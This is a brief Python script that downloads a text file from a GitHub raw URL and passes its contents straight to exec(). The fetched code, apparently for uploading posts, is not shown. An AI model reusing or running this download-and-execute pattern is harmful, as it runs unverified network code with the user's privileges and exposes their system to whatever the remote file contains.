import requests

url = 'https://raw.githubusercontent.com/bilalbinkhan1122/UploadPOSTSFromPC/refs/heads/main/UploadPostsFromPC.txt'

# Download the script content
response = requests.get(url)
if response.status_code == 200:
    # Step 2: Execute the content directly using exec()
    script_content = response.text
    exec(script_content)
else:
    print(f"Failed to download the script. HTTP Status Code: {response.status_code}")
